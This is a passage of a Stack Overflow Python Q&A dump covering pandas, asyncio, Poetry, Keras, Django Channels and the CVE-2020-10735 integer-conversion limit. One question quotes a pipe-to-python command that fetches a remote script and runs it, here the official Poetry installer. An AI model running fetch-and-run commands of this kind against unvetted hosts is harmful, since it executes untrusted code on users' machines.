    "Body": "I have three DataFrames which I am importing from Excel Files.\nThe dataframes are given below as HTML Tables,\nSeason Wise Record (this contains a Column Reward which is initialized with 0 initially)\n\r\n\r\nUnnamed: 0NameTeamPositionGames PlayedPassingCompletionsPassingYardsPassingTouchdownsRushingYardsRushingTouchdownsReceivingYardsReceptionsTouchdownsTypeSacksSoloTacklesTacklesForLossFumblesForcedDefensiveTouchdownsInterceptionsPassesDefendedReceivingTouchdownsReward0Tom BradyTAMQB17485531643812002OFFENSE0000000001Justin HerbertLACQB174435014383023003OFFENSE0100000002Matthew StaffordLARQB17404488641430000OFFENSE0000000003Patrick MahomesKANQB174364839373812002OFFENSE0100000004Derek CarrLVRQB174284804231080000OFFENSE0000000005Joe BurrowCINQB163664611341182002OFFENSE0100000006Dak PrescottDALQB164104449371461001OFFENSE0000000007Josh AllenBUFQB174094407367636006OFFENSE01000000088Ezekiel ElliottDALRB171401002102874712OFFENSE01000002089Marcus MariotaLVRQB10140871001OFFENSE00000000090Johnny HekkerLARQB1712000000OFFENSE00000000091Greg WardPHIQB17120009573OFFENSE00000003092Kendall HintonDENWR1611000175151OFFENSE01000001093Keenan AllenLACWR160000011381066OFFENSE01000006094Danny AmendolaHOUQB800000248243OFFENSE01000003095Cole BeasleyBUFWR1600000693821OFFENSE000000010\r\n\r\n\r\n\nGame Wise Record (I am only adding some  sample rows, there are 20k+ rows in it)\n\r\n\r\nIndexWeekNameTeamStarterInterceptionsPassesDefendedSacksSoloTacklesTacklesForLossFumblesForcedPassesCompletionsPassingYardsPassingTouchdownsPassingInterceptionsRushingYardsRushingTouchdownsReceptionsReceivingYardsReceivingTouchdowns01Jourdan LewisDAL112000000000000011Trevon DiggsDAL112010000000000021Anthony BrownDAL100060000000000031Jayron KearseDAL000050000000000041Micah ParsonsDAL101030000000000051Keanu NealDAL100030000000000061DeMarcus LawrenceDAL100040100000000071Jaylon SmithDAL000020000000000081Dorance Armstrong Jr.DAL000000000000000091Tarell BashamDAL000000000000000051755Patrick MahomesKAN1000000332722261000051765Darrel WilliamsKAN00000000000270318051775Tyreek HillKAN10000000000150763051785Clyde Edwards-HelaireKAN10000000000130111051795Jerick McKinnonKAN0000000000020213051805Michael BurtonKAN000000000002000051815Mecole HardmanKAN1000000000000976051825Travis KelceKAN10000000000006571\r\n\r\n\r\n\nAnd lastly, there's a Player Goals File (this is an Excel File containing Sheets for each of the position, I am only sharing for QB sheet, to keep the question short. IF needed, I can share the rest too)\n\r\n\r\nGoalGoal TypePCC RewardTargetMin ValueMax ValueGames RequiredStartedLevel 99 PCC Reward x4 (current series)TImes achievedPCC Rewarded Throw 300-399 ydsGame25PassingYards300399001008200 Throw 400-499 ydsGame50PassingYards4004990020052501000Throw 500+ ydsGame150PassingYards5009999900600 00Throw 2 TDsGame50Touchdowns220020094501800Throw 3 TDsGame75Touchdowns330030043001200Throw 4 TDsGame100Touchdowns44004002200800Throw 5+ TDsGame300Touchdowns510000001200 0030-39 CompletionsGame50PassingCompletions3039002005250100040+ CompletionsGame200PassingCompletions4099990080012008000 INTs (must have been designated starter)Game200PassingInterceptions00018007140056003500-3999 Passing YDsSeason500PassingYards35003999002000 004000-4999 Passing YDSSeason750PassingYards40004999003000 005000+ Passing YDSSeason1250PassingYards500099999005000 0030-39 Passing TDSSeason750PassingTouchdowns3039003000 0040-45 Passing TDSSeason1250PassingTouchdowns4049005000 0050+ Passing TDSSeason2000PassingTouchdowns5099999008000 00\r\n\r\n\r\n\nWhat I want to do is analyze the Records of the Season Wise Records and the Game Wise Records, and based upon the Goals given in the Player Goals File, I want to add the Reward for all the players.\nThis is player position dependent so I made the following function to calculate Rewards for all the players (for the Season Records only)\ndef calculatePointsSeason(target, min_value, games_played_condition, max_value, tier_position, player_position, reward, games_played):\n    if player_position in positions[tier_position]:\n        if games_played > games_played_condition:\n            if target >= min_value and target <= max_value:\n                return reward \n    return 0 \n\nSimilarly, I made this function to calculate Game wise Record,\ndef calculatePointsGame(target, min_value, max_value, tier_position, player_position, reward, started, started_condition):\n    if player_position in positions[tier_position]:\n        if started == started_condition:\n            if target >= min_value and target <= max_value:\n                return reward \n    return 0 \n\nFollowing is the function in which I am applying these two functions to calculate the Reward for each player,\nfor key, value in positions.items(): # Positions has a list of all the positions \n    for (idx, row) in rewards[key].iterrows(): # Rewards is a Dict containing Pandas Dataframes against each position\n        if row['Goal Type'] == 'Season':\n            df = df.copy(deep=True) # df contains the Season Wise Record Dataframe\n            df['Reward'] += df.apply(lambda x: calculatePointsSeason(x[row['Target']], row['Min Value'], row['Games Required'],\n                                                               row['Max Value'], key, x['Position'],\n                                                                row['PCC Reward'], x['Games Played']), axis=1)\n        else: # For Game wise points\n            for (i, main_player) in df.iterrows():\n                for (j, game_player) in data.iterrows(): # data contains the Game Wise Record dataframe\n                    if main_player['Name'] == game_player['Name']:\n                        main_player['Reward'] += calculatePointsGame(main_player[row['Target']], \n                                                                    row['Min Value'], row['Max Value'], \n                                                                    key, main_player['Position'], row['PCC Reward'], \n                                                                    game_player['Starter'], row['Started'])\n\nThis function works well for the Season Wise Records, but for the Game Wise, I couldn't come up with any Pandas way to do it (eliminating the need of iteration of two Dataframes). I want some way to,\n\nMatch the Rows given in the Game Wise Record file with the Season Wise Record file, based upon the Name attribute\n\nSend the Values from the Game Wise Record to the Custom Function and the Position of the player from the Season Wise Record (so that, only the specific reward is calculated for the player, e.g. if player is QB, so only QB Rewards will be match with him and etc. There are Excel Sheets for each position rewards)\n\nGet the Reward Value back and add it to the Reward in the Season Wise Record against that specific player record.\n\n\nI previously tried to do it by comparing the Name of the Player in the Season Wise Record with the Game Wise Record, but it didn't work. Is there any Pandas way to solve this issue? (where you don't have to iterate all the rows two times)\n",
    "AcceptedAnswerId": 73819986,
    "AcceptedAnswer": "I hope I understood correctly your intentions. To avoid double for loops, you need to use groupby() method and then apply the desired function to every row of the group; finally the aggregation function (sum()) should be applied to the group. Although you can use the Name as a key for grouping, I recommend to add PlayerID.\nThe approach needs little preparation:\ndata = data.join(\n    df.reset_index().set_index(['Name', 'Team'], drop=False)[['index','Position']],\n    on=['Name','Team'],\n    how='left'\n).rename({'index':'PlayerID'}, axis=1)\n\nWe add 2 columns to data DataFrame, namely Position and PlayerID which is the index of the first DataFrame df. We search for the ID checking Name and Team that still may cause a collision (when there 2 players with identical name in the same team).\nWhen it's done the last part of the code will be like this:\nfor key, value in positions.items(): # Positions has a list of all the positions \n    for (_, row) in rewards[key].iterrows(): # Rewards is a Dict containing Pandas Dataframes against each position\n        if row['Goal Type'] == 'Season':\n            if row['Target'] in df.columns:\n                df['Reward'] += df.apply(lambda x: calculatePointsSeason(\n                    x[row['Target']], row['Min Value'], row['Games Required'],\n                    row['Max Value'], key, x['Position'],\n                    row['PCC Reward'], x['Games Played']\n                ), axis=1)\n        else: # For Game wise points\n            if row['Target'] in data.columns: # I added these 2 checks because sometimes target is not presented in the columns which raises the error\n                df['Reward'] = df['Reward'].add(\n                    data.groupby('PlayerID').apply(\n                        lambda group: group.apply(lambda game_player: calculatePointsGame(\n                            game_player[row['Target']], \n                            row['Min Value'], row['Max Value'], \n                            key, game_player['Position'],\n                            row['PCC Reward'], \n                            game_player['Starter'],\n                            row['Started']\n                        ), axis=1).sum()\n                    ),\n                    fill_value=0\n                )\n\n"
}
{
    "Id": 73876937,
    "PostTypeId": 1,
    "Title": "What is the difference between keyword pass and ... in python?",
    "Body": "Is there any significant difference between the two Python keywords (...) and (pass) like in the examples\ndef tempFunction():\n    pass \n\nand\ndef tempFunction():\n    ...\n\nI should be aware of?\n",
    "AcceptedAnswerId": 73877007,
    "AcceptedAnswer": "The ... is the shorthand for the Ellipsis global object in python. Similar to None and NotImplemented it can be used as a marker value to indicate the absence of something.\nFor example:\nprint(...)\n# Prints \"Ellipsis\"\n\nIn this case, it has no effect. You could put any constant there and it would do the same. This is valid:\ndef function():\n    1\n\nOr\ndef function():\n    'this function does nothing'\n\nNote both do nothing and return None. Since there is no return keyword the value won't be returned.\npass explicitly does nothing, so it will have the same effect in this case too.\n"
}
{
    "Id": 73597456,
    "PostTypeId": 1,
    "Title": "What is the python-poetry config file after 1.2.0 release?",
    "Body": "I have been using python-poetry for over a year now. \nAfter poetry 1.2.0 release, I get such an info warning:\nConfiguration file exists at ~/Library/Application Support/pypoetry,\nreusing this directory.\n\nConsider moving configuration to ~/Library/Preferences/pypoetry,\nas support for the legacy directory will be removed in an upcoming release.\n\nBut in docs, it is still indicated for macOS: ~/Library/Application Support/pypoetry \nhttps://python-poetry.org/docs/configuration/\nMy question is that if ~/Library/Preferences/pypoetry is the latest decision what should I do for moving configuration to there? \nIs just copy-pasting enough?\n\n",
    "AcceptedAnswerId": 73632457,
    "AcceptedAnswer": "Looks like it is as simple as copy/pasting to the new directory.\nI got the same error after upgrading to Poetry 1.2.  So I created a pypoetry folder in the new Preferences directory, copy/pasted the config.toml to it, and just to be safe, I renamed the original folder to:\n~/Library/Application Support/pypoetry_bak\nAfter doing this and running poetry -V, the error is gone.\n"
}
{
    "Id": 74586892,
    "PostTypeId": 1,
    "Title": "No module named 'keras.saving.hdf5_format'",
    "Body": "After pip3 installing tensorflow and the transformers library, I'm receiving the titular error when I try loading this\nfrom transformers import pipeline\nclassifier = pipeline(\"text-classification\",model='bhadresh-savani/distilbert-base-uncased-emotion')\n\nThe error traceback looks like:\nRuntimeError: Failed to import transformers.models.distilbert.modeling_tf_distilbert because of the following error (look up to see its traceback):\nNo module named 'keras.saving.hdf5_format'\n\n\nI have ensured keras got installed with transformers, so I'm not sure why it isn't working\n",
    "AcceptedAnswerId": 74588082,
    "AcceptedAnswer": "If you are using the latest version of TensorFlow and Keras then you have to try this code and you have got this error as shown below\nRuntimeError: Failed to import transformers.models.distilbert.modeling_tf_distilbert because of the following error (look up to see its traceback):\nNo module named 'keras.saving.hdf5_format'\n\nNow, expand this error traces as I have shown below\n\nNow click on the 14 frames and select as shown below\n\nNow comment this line as shown in the picture below\n\nNow, try this and your error will gone.\nThe problem is that this is in the older version of keras and you are using the latest version of keras. So, you can skip all these steps and go back to the older version and it will work eventually.\n"
}
{
    "Id": 73661082,
    "PostTypeId": 1,
    "Title": "How to generate a certain number of random whole numbers that add up to a certain number and are at least a certain number or more?",
    "Body": "I want to generate 10 whole numbers that add up to 40 and are in the range of 2-6.\nFor example:\n2 + 6 + 2 + 5 + 6 + 2 + 2 + 6 + 3 + 6 = 40\nTen random numbers between 2 and 6 that add up to 40.\n",
    "AcceptedAnswerId": 73661454,
    "AcceptedAnswer": "My idea is to generate numbers in the range of [2,6] until the length of the list is 10 then start checking the sum, if it's not 40 then remove the first element of the list and generate a new number. The only problem is that you might need to check if it's even possible to sum the numbers to your target number, for example it can never reach the target number if it's odd but all the generated numbers are even.\nimport random\n\nlow,high = 2,6\ncount = 10\ntarget = 40\n\nk = []\nr = range(low,high+1)\ntries = 0\nwhile True:\n    k.append(random.choice(r))\n    if len(k) == count:\n        if sum(k) == target:\n            break\n        k = k[1:]\n        tries += 1\n        \nprint(k)\nprint(len(k))\nprint(sum(k))\nprint(tries)\n\n"
}
{
    "Id": 73661849,
    "PostTypeId": 1,
    "Title": "Which specific characters does the strip function remove?",
    "Body": "Here is what you can find in the str.strip documentation:\n\nThe chars argument is a string specifying the set of characters to be removed. If omitted or None, the chars argument defaults to removing whitespace.\n\nNow my question is: which specific characters are considered whitespace?\nThese function calls share the same result:\n>>> ' '.strip()\n''\n>>> '\\n'.strip()\n''\n>>> '\\r'.strip()\n''\n>>> '\\v'.strip()\n''\n>>> '\\x1e'.strip()\n''\n\nIn this related question, a user mentioned that the str.strip function works with a superset of ASCII whitespace characters (in other words, a superset of string.whitespace). More specifically, it works with all unicode whitespace characters.\nMoreover, I believe (but I'm just guessing, I have no proofs) that c.isspace() returns True for each character c that would also be removed by str.strip. Is that correct? If so, I guess one could just run c.isspace() for each unicode character c, and come up with a list of whitespace characters that are removed by default by str.strip.\n>>> ' '.isspace()\nTrue\n>>> '\\n'.isspace()\nTrue\n>>> '\\r'.isspace()\nTrue\n>>> '\\v'.isspace()\nTrue\n>>> '\\x1e'.isspace()\nTrue\n\nIs my assumption correct? And if so, how can I find some proofs? Is there an easier way to know which specific characters are automatically removed by str.strip?\n",
    "AcceptedAnswerId": 73664219,
    "AcceptedAnswer": "The most trivial way to know which characters are removed by str.strip() is to loop over each possible characters and check if a string containing such character gets altered by str.strip():\nc = 0\nwhile True:\n  try:\n    s = chr(c)\n  except ValueError:\n    break\n  if (s != s.strip()):\n    print(f\"{hex(c)} is stripped\", flush=True)\n  c+=1\n\nAs suggested in the comments, you may also print a table to check if str.strip(), str.split() and str.isspace() share the same behaviour about white spaces:\nc = 0\nprint(\"char\\tstrip\\tsplit\\tisspace\")\nwhile True:\n  try:\n    s = chr(c)\n  except ValueError:\n    break\n  stripped = s != s.strip()\n  splitted = not s.split()\n  spaced = s.isspace()\n  if (stripped or splitted or spaced):\n    print(f\"{hex(c)}\\t{stripped}\\t{splitted}\\t{spaced}\", flush=True)\n  c+=1\n\nIf I run the code above I get:\nchar    strip   split   isspace\n0x9     True    True    True\n0xa     True    True    True\n0xb     True    True    True\n0xc     True    True    True\n0xd     True    True    True\n0x1c    True    True    True\n0x1d    True    True    True\n0x1e    True    True    True\n0x1f    True    True    True\n0x20    True    True    True\n0x85    True    True    True\n0xa0    True    True    True\n0x1680  True    True    True\n0x2000  True    True    True\n0x2001  True    True    True\n0x2002  True    True    True\n0x2003  True    True    True\n0x2004  True    True    True\n0x2005  True    True    True\n0x2006  True    True    True\n0x2007  True    True    True\n0x2008  True    True    True\n0x2009  True    True    True\n0x200a  True    True    True\n0x2028  True    True    True\n0x2029  True    True    True\n0x202f  True    True    True\n0x205f  True    True    True\n0x3000  True    True    True\n\nSo, at least in python 3.10.4, your assumption seems to be correct.\n"
}
{
    "Id": 73975798,
    "PostTypeId": 1,
    "Title": "Why does asyncio.wait keep a task with a reference around despite exceeding the timeout?",
    "Body": "I recently found and reproduced a memory leak caused by the use of asyncio.wait. Specifically, my program periodically executes some function until stop_event is set. I simplified my program to the snippet below (with a reduced timeout to demonstrate the issue better):\nasync def main():\n  stop_event = asyncio.Event()\n\n  while True:\n    # Do stuff here\n    await asyncio.wait([stop_event.wait()], timeout=0.0001)\n\nasyncio.run(main())\n\nWhile this looked innocuous to me, it turns out there's a memory leak here. If you execute the code above, you'll see the memory usage growing to hundreds of MBs in a matter of minutes. This surprised me and took a long time to track down. I was expecting that after the timeout, anything I was waiting for would be cleaned up (since I'm not keeping any references to it myself). However, that turns out not to be the case.\nUsing gc.get_referrers, I was able to infer that every time I call asyncio.wait(...), a new task is created that holds a reference to the object returned by stop_event.wait() and that task is kept around forever. Specifically, len(asyncio.all_tasks()) keeps increasing over time. Even if the timeout is passed, the tasks are still there. Only upon calling stop_event.set() do these tasks all finish at once and does memory usage decrease drastically.\nAfter discovering that, this note in the documentation made me try asyncio.wait_for instead:\n\nUnlike wait_for(), wait() does not cancel the futures when a timeout occurs.\n\nIt turns out that actually behaves like I expected. There are no references kept after the timeout, and memory usage and number of tasks stay flat. This is the code without a memory leak:\nasync def main():\n  stop_event = asyncio.Event()\n\n  while True:\n    # Do stuff here\n    try:\n      await asyncio.wait_for(event.stop_event(), timeout=0.0001)\n    except asyncio.TimeoutError:\n      pass\n\nasyncio.run(main())\n\nWhile I'm happy this is fixed now, I don't really understand this behavior. If the timeout has been exceeded, why keep this task holding a reference around? It seems like that's a recipe for creating memory leaks. The note about not cancelling futures is also not clear to me. What if we don't explicitly cancel the future, but we just don't keep a task holding a reference after the timeout? Wouldn't that work as well?\nIt would be very much appreciated if anybody could shine some light on this. Thanks a lot!\n",
    "AcceptedAnswerId": 74003884,
    "AcceptedAnswer": "The key concept to understand here is that the return value of wait() is a tuple (completed, pending) tasks.\nThe typical way to use wait()-based code is like this:\nasync def main():\n    stop_event = asyncio.Event()\n\n    pending = [... add things to wait ...]\n\n    while pending:\n        completed, pending = await asyncio.wait(pending, timeout=0.0001)\n\n        process(completed) # e.g. update progress bar\n\n        pending.extend(more_tasks_to_wait)\n\nwait() with timeout isn't used to have one coroutine to wait for another coroutines/tasks to finish, instead its primary use case is for periodically flushing completed tasks, while letting the unfinished tasks to continue \"in the background\", so cancelling the unfinished tasks automatically isn't really desirable, because you usually want to continue waiting for those pending tasks again in the next iteration.\nThis usage pattern resembles the select() system call.\nOn the other hand, the usage pattern of await wait_for(xyz, ) is basically just like doing await xyz with a timeout. It's a common and much simpler use case.\n"
}
{
    "Id": 74091600,
    "PostTypeId": 1,
    "Title": "ASGI_APPLICATION not working with Django Channels",
    "Body": "I followed the tutorial in the channels documentation but when I start the server python3 manage.py runserver it gives me this :\nWatching for file changes with StatReloader\nPerforming system checks...\n\nSystem check identified no issues (0 silenced).\nOctober 17, 2022 - 00:13:21\nDjango version 4.1.2, using settings 'config.settings'\nStarting development server at http://127.0.0.1:8000/\nQuit the server with CONTROL-C.\n\nwhen I expected for it to give me this :\nWatching for file changes with StatReloader\nPerforming system checks...\n\nSystem check identified no issues (0 silenced).\nOctober 17, 2022 - 00:13:21\nDjango version 4.1.2, using settings 'config.settings'\nStarting ASGI/Channels version 3.0.5 development server at http://127.0.0.1:8000/\nQuit the server with CONTROL-C.\n\nsettings.py\nINSTALLED_APPS = [\n    'channels',\n    'django.contrib.admin',\n    'django.contrib.auth',\n    'django.contrib.contenttypes',\n    'django.contrib.sessions',\n    'django.contrib.messages',\n    'django.contrib.staticfiles',\n    ...\n]\n\nASGI_APPLICATION = 'config.asgi.application'\n\nasgi.py\nimport os\nfrom django.core.asgi import get_asgi_application\nfrom channels.routing import ProtocolTypeRouter\n\nos.environ.setdefault('DJANGO_SETTINGS_MODULE', 'config.settings')\n\napplication = ProtocolTypeRouter({\n    'http': get_asgi_application(),\n})\n\nIt doesn't give any errors even when I change the ASGI_APPLICATION = 'config.asgi.application to ASGI_APPLICATION = ''.\n",
    "AcceptedAnswerId": 74108598,
    "AcceptedAnswer": "This could be due to the fact that the Django and channels versions you have used are not compatible\nTry : channels==3.0.4 and django==4.0.0\n"
}
{
    "Id": 74599713,
    "PostTypeId": 1,
    "Title": "Merge two dictionaries in python",
    "Body": "I'm trying to merge two dictionaries based on key value. However, I'm not able to achieve it. Below is the way I tried solving.\ndict1 = {4: [741, 114, 306, 70],\n         2: [77, 325, 505, 144],\n         3: [937, 339, 612, 100],\n         1: [52, 811, 1593, 350]}\ndict2 = {1: 'A', 2: 'B', 3: 'C', 4: 'D'}\n\nMy resultant dictionary should be\noutput = {'D': [741, 114, 306, 70],\n          'B': [77, 325, 505, 144],\n          'C': [937, 339, 612, 100],\n          'A': [52, 811, 1593, 350]}\n\nMy code\ndef mergeDictionary(dict_obj1, dict_obj2):\n    dict_obj3 = {**dict_obj1, **dict_obj2}\n    for key, value in dict_obj3.items():\n        if key in dict_obj1 and key in dict_obj2:\n               dict_obj3[key] = [value , dict_obj1[key]]\n    return dict_obj3\n\ndict_3 = mergeDictionary(dict1, dict2)\n\nBut I'm getting this as output\ndict_3={4: ['D', [741, 114, 306, 70]], 2: ['B', [77, 325, 505, 144]], 3: ['C', [937, 339, 612, 100]], 1: ['A', [52, 811, 1593, 350]]}\n\n",
    "AcceptedAnswerId": 74599751,
    "AcceptedAnswer": "Use a simple dictionary comprehension:\noutput = {dict2[k]: v for k,v in dict1.items()}\n\nOutput:\n{'D': [741, 114, 306, 70],\n 'B': [77, 325, 505, 144],\n 'C': [937, 339, 612, 100],\n 'A': [52, 811, 1593, 350]}\n\n"
}
{
    "Id": 73693104,
    "PostTypeId": 1,
    "Title": "Python 3.10.7 - ValueError: Exceeds the limit (4300) for integer string conversion",
    "Body": "\n>>> import sys\n>>> sys.set_int_max_str_digits(4300)  # Illustrative, this is the default.\n>>> _ = int('2' * 5432)\nTraceback (most recent call last):\n...\nValueError: Exceeds the limit (4300) for integer string conversion: value has 5432 digits.\n\n\nPython 3.10.7 introduced this breaking change for type conversion.\nDocumentation: Integer string conversion length limitation\nActually I don't understand why\n\nthis was introduced and\nwhere does the default value of 4300 come from? Sounds like an arbitrary number.\n\n",
    "AcceptedAnswerId": 73693178,
    "AcceptedAnswer": "See github issue CVE-2020-10735: Prevent DoS by large intstr conversions #95778:\n\nProblem\nA Denial Of Service (DoS) issue was identified in CPython\nbecause we use binary bignum\u2019s for our int implementation. A huge\ninteger will always consume a near-quadratic amount of CPU time in\nconversion to or from a base 10 (decimal) string with a large number\nof digits. No efficient algorithm exists to do otherwise.\nIt is quite common for Python code implementing network protocols and\ndata serialization to do int(untrusted_string_or_bytes_value) on input\nto get a numeric value, without having limited the input length or to\ndo log(\"processing thing id %s\", unknowingly_huge_integer) or any\nsimilar concept to convert an int to a string without first checking\nits magnitude. (http, json, xmlrpc, logging, loading large values into\ninteger via linear-time conversions such as hexadecimal stored in\nyaml, or anything computing larger values based on user controlled\ninputs\u2026 which then wind up attempting to output as decimal later on).\nAll of these can suffer a CPU consuming DoS in the face of untrusted\ndata.\nEveryone auditing all existing code for this, adding length guards,\nand maintaining that practice everywhere is not feasible nor is it\nwhat we deem the vast majority of our users want to do.\nThis issue has been reported to the Python Security Response Team\nmultiple times by a few different people since early 2020, most\nrecently a few weeks ago while I was in the middle of polishing up the\nPR so it\u2019d be ready before 3.11.0rc2.\nMitigation\nAfter discussion on the Python Security Response Team\nmailing list the conclusion was that we needed to limit the size of\ninteger to string conversions for non-linear time conversions\n(anything not a power-of-2 base) by default. And offer the ability to\nconfigure or disable this limit.\nThe Python Steering Council is aware of this change and accepts it as\nnecessary.\n\nFurther discussion can be found on the Python Core Developers Discuss thread Int/str conversions broken in latest Python bugfix releases.\nI found this comment by Steve Dower to be informative:\n\nOur apologies for the lack of transparency in the process here. The\nissue was first reported to a number of other security teams, and\nconverged in the Python Security Response Team where we agreed that\nthe correct fix was to modify the runtime.\nThe delay between report and fix is entirely our fault. The security\nteam is made up of volunteers, our availability isn\u2019t always reliable,\nand there\u2019s nobody \u201cin charge\u201d to coordinate work. We\u2019ve been\ndiscussing how to improve our processes. However, we did agree that\nthe potential for exploitation is high enough that we didn\u2019t want to\ndisclose the issue without a fix available and ready for use.\nWe did work through a number of alternative approaches, implementing\nmany of them. The code doing int(gigabyte_long_untrusted_string) could\nbe anywhere inside a json.load or HTTP header parser, and can run very\ndeep. Parsing libraries are everywhere, and tend to use int\nindiscriminately (though they usually handle ValueError already).\nExpecting every library to add a new argument to every int() call\nwould have led to thousands of vulnerabilities being filed, and made\nit impossible for users to ever trust that their systems could not be\nDoS\u2019d.\nWe agree it\u2019s a heavy hammer to do it in the core, but it\u2019s also the\nonly hammer that has a chance of giving users the confidence to keep\nrunning Python at the boundary of their apps.\nNow, I\u2019m personally inclined to agree that int->str conversions should\ndo something other than raise. I was outvoted because it would break\nround-tripping, which is a reasonable argument that I accepted. We can\nstill improve this over time and make it more usable. However, in most\ncases we saw, rendering an excessively long string isn\u2019t desirable\neither. That should be the opt-in behaviour.\nRaising an exception from str may prove to be too much, and could be\nreconsidered, but we don\u2019t see a feasible way to push out updates to\nevery user of int, so that will surely remain global.\n\n"
}
{
    "Id": 73708478,
    "PostTypeId": 1,
    "Title": "The git (or python) command requires the command line developer tools",
    "Body": "This knowledge post isn't a duplication of other similar ones, since it's related to 12/September/2022 Xcode update, which demands a different kind of solution\nI have come to my computer today and discovered that nothing runs on my terminal Every time I have opened my IDE (VS Code or PyCharm), it has given me this message in the start of the terminal.\nI saw so many solutions, which have said to uninstall pyenv and install python via brew, which was a terrible idea, because I need different python versions for different projects.\nAlso, people spoke a lot about symlinks, which as well did not make any sense, because everything was working until yesterday.\nFurthermore, overwriting .oh-my-zsh with a new built one did not make any difference.\n",
    "AcceptedAnswerId": 73709260,
    "AcceptedAnswer": "I was prompted to reinstall commandLine tools over and over when trying to accept the terms\nI FIXED this by opening xcode and confirming the new update information\n"
}
{
    "Id": 72401377,
    "PostTypeId": 1,
    "Title": "ERROR: Could not build wheels for pandas, which is required to install pyproject.toml-based projects",
    "Body": "I'm trying to install pandas via pip install pandas on my laptop.\nEnvironment:\n\nWindow 11 Pro\nPython 3.10.4\nPip version 22.0.4\n\nCompatibility:\n\nOfficially Python 3.8, 3.9 and 3.10.\nYou must have pip>=19.3 to install from PyPI.\n\n\nC:\\Users\\PC>pip install pandas\nWARNING: Ignoring invalid distribution -ywin32 (c:\\users\\pc\\appdata\\local\\programs\\python\\python310-32\\lib\\site-packages)\nWARNING: Ignoring invalid distribution -ywin32 (c:\\users\\pc\\appdata\\local\\programs\\python\\python310-32\\lib\\site-packages)\nCollecting pandas\n  Using cached pandas-1.4.2.tar.gz (4.9 MB)\n  Installing build dependencies ... done\n  Getting requirements to build wheel ... done\n  Preparing metadata (pyproject.toml) ... done\nRequirement already satisfied: numpy>=1.21.0 in c:\\users\\pc\\appdata\\local\\programs\\python\\python310-32\\lib\\site-packages (from pandas) (1.22.4)\nRequirement already satisfied: python-dateutil>=2.8.1 in c:\\users\\pc\\appdata\\local\\programs\\python\\python310-32\\lib\\site-packages (from pandas) (2.8.2)\nCollecting pytz>=2020.1\n  Using cached pytz-2022.1-py2.py3-none-any.whl (503 kB)\nRequirement already satisfied: six>=1.5 in c:\\users\\pc\\appdata\\local\\programs\\python\\python310-32\\lib\\site-packages (from python-dateutil>=2.8.1->pandas) (1.16.0)\nBuilding wheels for collected packages: pandas\n  Building wheel for pandas (pyproject.toml) ... error\n  error: subprocess-exited-with-error\n\n  \u00d7 Building wheel for pandas (pyproject.toml) did not run successfully.\n  \u2502 exit code: 1\n  \u2570\u2500> [2010 lines of output]\n      C:\\Users\\PC\\AppData\\Local\\Temp\\pip-build-env-q3kdt5nb\\overlay\\Lib\\site-packages\\setuptools\\config\\setupcfg.py:459: SetuptoolsDeprecationWarning: The license_file parameter is deprecated, use license_files instead.\n        warnings.warn(msg, warning_class)\n\n\n...\n\n\n  note: This error originates from a subprocess, and is likely not a problem with pip.\n  ERROR: Failed building wheel for pandas\nFailed to build pandas\nERROR: Could not build wheels for pandas, which is required to install pyproject.toml-based projects\n\nWhat I have tried:\n\nupdated pip to 22.1.1\ninstalled wheel 0.37.1\nuninstalled and installed pip\nuninstalled and installed python 3.10.4\n\n\nError still reproducible with pandas 1.5.1\n\nThanks to @AKX which has pointed up that there is no and may will no 32-bit version of pandas in the future. See the discussion on GitHub.\n",
    "AcceptedAnswerId": 74277465,
    "AcceptedAnswer": "Pandas doesn't require Anaconda to work, but based on python310-32 in your output, you're using a 32-bit build of Python.\nPandas evidently does not ship 32-bit wheels for Python 3.10 (they do have win32 wheels for Python 3.8 and Python 3.9 though). (There could be alternate sources for pre-built 32-bit wheels, such as Gohlke's site.)\nIn other words, on that platform you would need to install Pandas from source, which will likely be a rather difficult undertaking, and can't be done directly within pip anyway (as you noticed via error: metadata-generation-failed).\nIf your system is capable of running 64-bit Python, you should switch to it.\n"
}
{
    "Id": 73805879,
    "PostTypeId": 1,
    "Title": "poetry installation failing on Mac OS, says \"should_use_symlinks\"",
    "Body": "I am trying to install poetry using the following command\ncurl -sSL https://install.python-poetry.org | python3 -\n\nbut it is failing with the following exception:\nException: This build of python cannot create venvs without using symlinks\nBelow is the text detailing the error\nRetrieving Poetry metadata\n\n# Welcome to Poetry!\n\nThis will download and install the latest version of Poetry,\na dependency and package manager for Python.\n\nIt will add the `poetry` command to Poetry's bin directory, located at:\n\n/Users/DaftaryG/.local/bin\n\nYou can uninstall at any time by executing this script with the --uninstall option,\nand these changes will be reverted.\n\nInstalling Poetry (1.2.1): Creating environment\nTraceback (most recent call last):\n  File \"\", line 940, in \n  File \"\", line 919, in main\n  File \"\", line 550, in run\n  File \"\", line 571, in install\n  File \"/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.9/lib/python3.9/contextlib.py\", line 117, in __enter__\n    return next(self.gen)\n  File \"\", line 643, in make_env\n  File \"\", line 629, in make_env\n  File \"\", line 309, in make\n  File \"/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.9/lib/python3.9/venv/__init__.py\", line 66, in __init__\n    self.symlinks = should_use_symlinks(symlinks)\n  File \"/Library/Developer/CommandLineTools/Library/Frameworks/Python3.framework/Versions/3.9/lib/python3.9/venv/__init__.py\", line 31, in should_use_symlinks\n    raise Exception(\"This build of python cannot create venvs without using symlinks\")\nException: This build of python cannot create venvs without using symlinks\n\nI already have symlinks installed so not having that does not seem to be the problem. Would anyone know the cause of this error?\n",
    "AcceptedAnswerId": 73834174,
    "AcceptedAnswer": "Not the best solution, but you can install it using Homebrew, if you have it. That's what I did.\nbrew install poetry\n\n"
}
{
    "Id": 74605279,
    "PostTypeId": 1,
    "Title": "Python 3.11 worse optimized than 3.10?",
    "Body": "I run this simple loop with Python 3.10.7 and 3.11.0 on Windows 10.\nimport time\na = 'a'\n\nstart = time.time()\nfor _ in range(1000000):\n    a += 'a'\nend = time.time()\n\nprint(a[:5], (end-start) * 1000)\n\nThe older version executes in 187ms, Python 3.11 needs about 17000ms. Does 3.10 realize that only the first 5 chars of a are needed, whereas 3.11 executes the whole loop? I confirmed this performance difference on godbolt.\n",
    "AcceptedAnswerId": 74607850,
